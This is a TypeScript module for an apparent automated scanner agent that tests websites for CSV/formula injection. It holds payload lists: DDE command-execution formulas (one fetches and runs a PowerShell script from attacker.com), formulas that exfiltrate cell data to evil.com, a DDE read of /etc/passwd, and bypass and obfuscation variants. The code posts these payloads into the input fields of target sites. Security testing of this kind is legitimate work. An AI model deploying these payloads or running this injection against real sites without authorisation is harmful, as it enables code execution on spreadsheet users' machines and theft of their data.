/**
 * CSV Injection Agent
 * Based on PayloadsAllTheThings/CSV Injection
 * 
 * Detects and exploits CSV/Formula injection:
 * - Excel formula injection (DDE)
 * - Google Sheets exploitation
 * - LibreOffice Calc attacks
 * - Data exfiltration via formulas
 * - Command execution via DDE
 */

import { Job } from 'bullmq';
import { BaseAgent } from './base';
import logger from '../utils/logger';
import database from '../services/database';

interface CSVInjectionJob {
  programId: string;
  scanId: string;
  urls: string[];
  options?: {
    testExport?: boolean;
    testImport?: boolean;
    collaboratorDomain?: string;
  };
}

// CSV Injection Payloads
const CSV_PAYLOADS = {
  // Basic formula injection
  basic: [
    '=1+1',
    '=HYPERLINK("http://evil.com")',
    '@SUM(1+1)',
    '+1+1',
    '-1+1',
    '|1+1',
  ],

  // DDE (Dynamic Data Exchange) - Command execution
  dde: [
    '=cmd|"/C calc"!A0',
    '=MSEXCEL|"\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc"!A0',
    '=DDE("cmd";"/C calc";"__DdesystemLink__")',
    '+cmd|"/C notepad"!A0',
    '-cmd|"/C powershell IEX(wget attacker.com/shell.ps1)"!A0',
    '=AAAA+BBBB-CCCC&"=cmd|/C calc!A0"',
  ],

  // Data exfiltration
  exfiltration: [
    '=HYPERLINK("http://evil.com/?data="&A1&B1&C1,"Click")',
    '=WEBSERVICE("http://evil.com/?data="&A1)',
    '=IMPORTXML("http://evil.com/?d="&A1,"/a")',
    '=IMPORTDATA("http://evil.com/?d="&A1)',
    '=IMPORTHTML("http://evil.com/?d="&A1,"table",1)',
    '=IMAGE("http://evil.com/log.gif?d="&A1)',
  ],

  // Google Sheets specific
  googleSheets: [
    '=IMPORTRANGE("https://docs.google.com/spreadsheets/d/xxx","Sheet1!A1")',
    '=IMPORTXML("http://evil.com/","//a")',
    '=IMPORTDATA("http://evil.com/data.csv")',
    '=IMPORTFEED("http://evil.com/feed.xml")',
  ],

  // LibreOffice specific
  libreOffice: [
    '=DDE("soffice";"./../../etc/passwd";"Sheet1.A1")',
    '=SHELL("calc")',
  ],

  // Bypass techniques
  bypass: [
    // Tab prefix
    '\t=1+1',
    // Newline prefix
    '\n=1+1',
    // Quote wrapping bypass
    '"=1+1"',
    // Unicode variants
    '\u0000=1+1',
    '\uFEFF=1+1',
    // Split formula
    '="=cmd|"&"/C calc!A0"',
  ],

  // Obfuscation
  obfuscated: [
    '=CHAR(67)&CHAR(77)&CHAR(68)', // CMD
    '=CONCATENATE("=","cmd|","/C calc!A0")',
    '=INDIRECT("A"&"1")',
  ],
};

// Common CSV export endpoints
const EXPORT_ENDPOINTS = [
  '/export/csv',
  '/download/csv',
  '/api/export',
  '/reports/download',
  '/data/export',
  '/users/export',
  '/admin/export',
  '/analytics/export',
];

// Common input fields that might end up in CSV
const INPUT_FIELDS = [
  'name', 'username', 'email', 'title', 'description',
  'comment', 'message', 'notes', 'address', 'company',
  'bio', 'about', 'summary', 'content', 'text',
];

export class CSVInjectionAgent extends BaseAgent<CSVInjectionJob> {
  constructor() {
    super('csvinjection');
  }

  protected getSteps() {
    return [
      { name: 'Identify CSV export endpoints', metadata: {} },
      { name: 'Test formula injection in inputs', metadata: {} },
      { name: 'Verify payload in exported CSV', metadata: {} },
      { name: 'Test DDE command execution', metadata: {} },
      { name: 'Test data exfiltration', metadata: {} },
    ];
  }

  async process(job: Job<CSVInjectionJob>): Promise<any> {
    const { programId, scanId, urls, options = {} } = job.data;
    const findings: any[] = [];
    const collaborator = options.collaboratorDomain || 'evil.com';

    logger.info({ urlCount: urls.length }, 'Starting CSV injection testing');

    for (const url of urls) {
      try {
        // Find CSV export endpoints
        const exportEndpoints = await this.findExportEndpoints(url);
        
        // Test injection via input fields
        const inputFindings = await this.testInputInjection(url, collaborator);
        findings.push(...inputFindings);

        // Test export endpoints
        for (const endpoint of exportEndpoints) {
          const exportFindings = await this.testExportEndpoint(endpoint, collaborator);
          findings.push(...exportFindings);
        }
      } catch (error) {
        logger.error({ error, url }, 'Error testing CSV injection');
      }
    }

    // Store findings
    for (const finding of findings) {
      await this.storeFinding(programId, scanId, finding);
    }

    return {
      totalUrls: urls.length,
      findings: findings.length,
      vulnerabilities: findings,
    };
  }

  private async findExportEndpoints(baseUrl: string): Promise<string[]> {
    const found: string[] = [];
    const urlObj = new URL(baseUrl);
    const base = `${urlObj.protocol}//${urlObj.host}`;

    for (const endpoint of EXPORT_ENDPOINTS) {
      try {
        const response = await fetch(`${base}${endpoint}`, { method: 'HEAD' });
        if (response.status !== 404) {
          found.push(`${base}${endpoint}`);
        }
      } catch {
        // Continue
      }
    }

    return found;
  }

  private async testInputInjection(url: string, collaborator: string): Promise<any[]> {
    const findings: any[] = [];

    // Test each payload in common input fields
    for (const payload of [...CSV_PAYLOADS.basic, ...CSV_PAYLOADS.dde.slice(0, 3)]) {
      for (const field of INPUT_FIELDS.slice(0, 5)) {
        try {
          const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ [field]: payload }),
          });

          if (response.ok) {
            // Check if the payload was stored (would need export to verify)
            findings.push({
              type: 'csv-injection-potential',
              url,
              field,
              payload,
              severity: 'medium',
              evidence: 'Payload accepted in input field',
              recommendation: 'Export data to CSV and check if formula executes',
              impact: this.getImpact(payload),
            });
          }
        } catch {
          // Continue
        }
      }
    }

    return findings;
  }

  private async testExportEndpoint(endpoint: string, collaborator: string): Promise<any[]> {
    const findings: any[] = [];

    try {
      const response = await fetch(endpoint);
      const contentType = response.headers.get('content-type') || '';
      const body = await response.text();

      // Check if it's actually CSV
      if (contentType.includes('csv') || contentType.includes('text/plain') || 
          body.includes(',') && body.includes('\n')) {
        
        // Check for formula characters in CSV
        const lines = body.split('\n');
        for (const line of lines) {
          const cells = line.split(',');
          for (const cell of cells) {
            const trimmed = cell.trim().replace(/^["']|["']$/g, '');
            if (this.isFormulaInjection(trimmed)) {
              findings.push({
                type: 'csv-injection-confirmed',
                url: endpoint,
                payload: trimmed,
                severity: 'high',
                evidence: 'Formula found in exported CSV',
                impact: this.getImpact(trimmed),
              });
            }
          }
        }

        // Check if CSV is properly escaped
        if (!this.isProperlyEscaped(body)) {
          findings.push({
            type: 'csv-no-escaping',
            url: endpoint,
            severity: 'medium',
            evidence: 'CSV export does not properly escape formula characters',
            recommendation: 'Prefix cells starting with =, +, -, @, | with single quote',
          });
        }
      }
    } catch (error) {
      // Continue
    }

    return findings;
  }

  private isFormulaInjection(cell: string): boolean {
    const formulaStarts = ['=', '+', '-', '@', '|', '\t=', '\n='];
    return formulaStarts.some(start => cell.startsWith(start));
  }

  private isProperlyEscaped(csv: string): boolean {
    // Check if formula characters are escaped with single quote
    const lines = csv.split('\n');
    for (const line of lines) {
      const cells = line.split(',');
      for (const cell of cells) {
        const trimmed = cell.trim();
        if (this.isFormulaInjection(trimmed) && !trimmed.startsWith("'")) {
          return false;
        }
      }
    }
    return true;
  }

  private getImpact(payload: string): string {
    if (payload.toLowerCase().includes('cmd') || payload.toLowerCase().includes('dde')) {
      return 'Remote Code Execution via DDE';
    }
    if (payload.includes('HYPERLINK') || payload.includes('WEBSERVICE') || 
        payload.includes('IMPORT')) {
      return 'Data exfiltration via formula';
    }
    return 'Formula injection - potential for RCE or data theft';
  }

  private async storeFinding(programId: string, scanId: string, finding: any): Promise<void> {
    try {
      await database.query(
        `INSERT INTO vulnerabilities (program_id, scan_id, type, url, severity, details, created_at)
         VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)`,
        [programId, scanId, finding.type, finding.url, finding.severity, JSON.stringify(finding)]
      );
    } catch (error) {
      logger.error({ error }, 'Failed to store CSV injection finding');
    }
  }
}

export default new CSVInjectionAgent();
